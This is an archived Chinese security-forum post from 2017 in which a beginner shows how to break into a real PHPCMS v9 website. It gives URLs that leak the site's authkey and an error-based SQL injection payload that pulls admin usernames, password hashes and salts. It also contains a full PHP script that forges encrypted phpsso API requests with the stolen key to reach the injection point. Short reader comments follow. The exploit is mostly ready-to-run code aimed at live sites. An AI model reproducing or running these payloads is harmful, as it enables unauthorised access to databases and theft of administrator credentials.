> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.ichunqiu.com](https://bbs.ichunqiu.com/thread-19033-1-1.html) ![](https://bbs.ichunqiu.com/template/win8mi_15th_design/src/noLogin.jpg)icq27160d12  我是小白，这是我写的第一篇文章，希望各位大牛多多指点。  
之前遇到一个 php 站，翻看一遍没什么可用的，就尝试下 robots.txt。 ![](data/attachment/forum/201702/14/205645mkhfnjj1dueljl8c.png)

**1.png** _(76.34 KB, 下载次数: 46)_

[下载附件](forum.php?mod=attachment&aid=Mzg1OTZ8ZjRiYzcxMjR8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)

2017-2-14 20:56 上传

  
phpcms  v9 的，然后百度。找到爆 authkey 注入的。按照网上的步骤自己弄，不行。然后找到一个大牛的视频，一下就搞定了。鉴于网上的 phpcms authkey 注入文章太过深奥，对于像我这样的新手搞不来，所以自己写一篇。  
爆 authkey exp:  
1、api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin  
2、/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ  
第一个 exp：  
![](data/attachment/forum/201702/14/210851gdnetdnu1k7tatnb.png)

**2.png** _(86.24 KB, 下载次数: 45)_

[下载附件](forum.php?mod=attachment&aid=Mzg1OTd8MWVhZjhkMTV8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)

2017-2-14 21:08 上传

  
第二个 exp:  
![](data/attachment/forum/201702/14/214546jl4lvohwesvrot9o.png)

**8.png** _(103.68 KB, 下载次数: 35)_

[下载附件](forum.php?mod=attachment&aid=Mzg2MDB8OTEyNjE0NzR8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)

2017-2-14 21:45 上传

  
爆出 authkey 后就是利用了。首先要搭建 php 环境，搭环境网上有很多教程，这里就不赘述了。  
首先给出 exp：  
php?url=url&key=key&id=userid=1%20and%20(SELECT%201%20FROM(SELECT%20count(*),concat((SELECT(SELECT%20concat(0x7e,0x27,cast((substring((select+concat(0x7e,0x27,username,0x3a,+password,+0x3a,+encrypt,0x27,0x40,0x7e)+FROM+`v9_admin`+WHERE+1+limit+0,1),1,62))%20as%20char),0x27,0x7e))%20FROM%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20FROM%20information_schema.columns%20group%20by%20x)a)  
注入脚本：  
[PHP] _纯文本查看_ _复制代码_

```
<?php
#error_reporting(0);
 
$url = $_GET['url'];
$key = $_GET['key'];
//$host = 'http://网站/';
//$auth_key = '爆的key';
//$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
 
$host = "http://$url/";
$auth_key = "$key";
$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
$strings = "action=member_add&uid=88888&random=333333&username=test123456&password=e445061346e44cc38d9f985836b9eac6&email=ffff@qq.com®ip=8.8.8.8";
 
$ecode = sys_auth($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
#echo $url;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth2($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth2($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth3($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth3($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
        $key_length = 4;
        $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
        $fixedkey = md5($key);
        $egiskeys = md5(substr($fixedkey, 16, 16));
        $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
        $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
        $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(strtr(substr($string, $key_length), '-_', '+/'));
 
        if($operation=='ENCODE'){
                $string .= substr(md5(microtime(true)), -4);
        }
        if(function_exists('mcrypt_encrypt')==true){
                $result=sys_auth_ex($string, $operation, $fixedkey);
        }else{
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
        }
        if($operation=='DECODE'){
                $result = substr($result, 0,-4);
        }
         
        if($operation == 'ENCODE') {
                return $runtokey . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        } else {
                if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                        return substr($result, 26);
                } else {
                        return '';
                }
        }
}
 
function sys_auth_ex($string,$operation = 'ENCODE',$key) 
{ 
    $encrypted_data="";
    $td = mcrypt_module_open('rijndael-256', '', 'ecb', '');
 
    $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
    $key = substr($key, 0, mcrypt_enc_get_key_size($td));
    mcrypt_generic_init($td, $key, $iv);
 
    if($operation=='ENCODE'){
        $encrypted_data = mcrypt_generic($td, $string);
    }else{
        $encrypted_data = rtrim(mdecrypt_generic($td, $string));
    }
    mcrypt_generic_deinit($td);
    mcrypt_module_close($td);
    return $encrypted_data;
}
 
function  sys_auth2($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $ckey_length = 4;
                $key = md5($key != '' ? $key : $this->ps_auth_key);
                $keya = md5(substr($key, 0, 16));
                $keyb = md5(substr($key, 16, 16));
                $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
                $cryptkey = $keya.md5($keya.$keyc);
                $key_length = strlen($cryptkey);
 
                $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + 
 
time() : 0).substr(md5($string.$keyb), 0, 16).$string;
                $string_length = strlen($string);
 
                $result = '';
                $box = range(0, 255);
 
                $rndkey = array();
                for($i = 0; $i <= 255; $i++) {
                        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
                }
 
                for($j = $i = 0; $i < 256; $i++) {
                        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
                        $tmp = $box[$i];
                        $box[$i] = $box[$j];
                        $box[$j] = $tmp;
                }
 
                for($a = $j = $i = 0; $i < $string_length; $i++) {
                        $a = ($a + 1) % 256;
                        $j = ($j + $box[$a]) % 256;
                        $tmp = $box[$a];
                        $box[$a] = $box[$j];
                        $box[$j] = $tmp;
                        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
                }
 
                if($operation == 'DECODE') {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$keyb), 0, 16)) {
                                return substr($result, 26);
                        } else {
                                return '';
                        }
                } else {
                        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
                }
        }
 
function sys_auth3($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $key_length = 4;
                $key = md5($key);
                $fixedkey = md5($key);
                $egiskeys = md5(substr($fixedkey, 16, 16));
                $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
                $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
                  
                $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(substr($string, $key_length));
                //10位密文过期信息+16位明文和密钥生成的密文验证信息+明文
                  
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                  $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
                  
                if($operation == 'ENCODE') {
                    return $runtokey . str_replace('=', '', base64_encode($result));
                } else {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                          return substr($result, 26);
                        } else {
                          return '';
                        }
                }
    }
 
 
?>
```

在 6,7 行填写上相应的网站域名和 authkey，丢到根目录下运行。后面加上 exp 就可以了（exp 中也要填写相应的网站域名和 authkey），像这样：  
![](data/attachment/forum/201702/14/212740v1yr0xx83x089p18.png)

**4.png** _(130.19 KB, 下载次数: 49)_

[下载附件](forum.php?mod=attachment&aid=Mzg1OTl8NTUwMDU5YjF8MTYxMjA2NzY1OXwwfDE5MDMz&nothumb=yes)  [保存到相册](javascript:;)

2017-2-14 21:27 上传

  
后面附上大牛视频：[http://bbs.ichunqiu.com/forum.ph ... mp;highlight=phpcms](http://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=11898&highlight=phpcms)  
  
  
 ![](https://bbs.ichunqiu.com/uc_server/avatar.php?uid=50014&size=middle) 小伙子有潜力哦，可以考虑加入作家团，不过这篇文章水准还不够，可以继续加油写一篇更好的，先加我 QQ：286894635，我们聊聊吧 ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==) 厉害厉害 收下了 ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==) 厉害了，膜拜！ ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==) 为毛我 183 行提示错误![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==)

> [Orvilla 发表于 2017-5-9 15:21](https://bbs.ichunqiu.com/forum.php?mod=redirect&goto=findpost&pid=320026&ptid=19033)  
> 为毛我 183 行提示错误

哪里来的 183 行 ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==) 有自动化注入脚本没![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==)

> [adshy 发表于 2017-9-19 02:59](https://bbs.ichunqiu.com/forum.php?mod=redirect&goto=findpost&pid=367645&ptid=19033)  
> 有自动化注入脚本没

要自己写 ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAOVBMVEX///+AgICfn5+Hh4f39/fPz8+vr6+QkJDg4ODv7+/n5+fAwMCoqKiYmJjHx8fX19e4uLjQ0NDIyMhhw/XSAAACBUlEQVRYw6VX2ZKEIAw0ATnk8Pj/j90q3V13SSOxpl+mHEknaUKCUw9xTZnpBLu02ukV4lGoAR9Rbb4Xgii7ztxTF35/ay4p1kdzm2mI/KDn4kkB0w3iICVmbO9IDae31zMkoo8YZkJgl5IrGh1WpHaN34VdDUks//YfrNjsn/cO8NtnAedhivl+G6D9kCH8Buhl/JptLv0dLMIcuqnTBY8TGCdhelvohfGjI3mEEybYZKGdZTKokcfNipCXpg4IysgoMAwDl5KegFGwy2cEYZpfEBQkAjpnehFpQ2HRCwKeDKHdhQiQgGBcEE5NgEWwhgAm/eSo2BchmAXMPUMwBSaEYlE/0RPIGWxLb8BkwiiLam6n/kgzx+3+IOoSBGSbr5+0nN43cz0SnE9Wpr9O0/qz2psf0jCtTrqSR8zFK2lu1D5FjZtpnLX1wfGu/Pxn3e8QillUXGxa3A07J8fimjqb9tixrD8JXJJ8UQp7NcN6n7LrScvQTLAqxtEItTm0/r5wKOH/j9AgutAIc5MzE4VXBLa56UUjOsAwB2+bhuteprCIf9wr+yp7tl5H7C0TzW/tZQwaJQ+i2mX2w92M/BBpMEMhkiGzPtOXhyBCGaYZPFHBH6l2z90cRcfh3QJr8lWjsq1nn2Xe0hHCEvaUmL/btRaxyo/vFKdXiCFlPmk8u9rvdl/WWxJO0oeE7gAAAABJRU5ErkJggg==) 支持一下~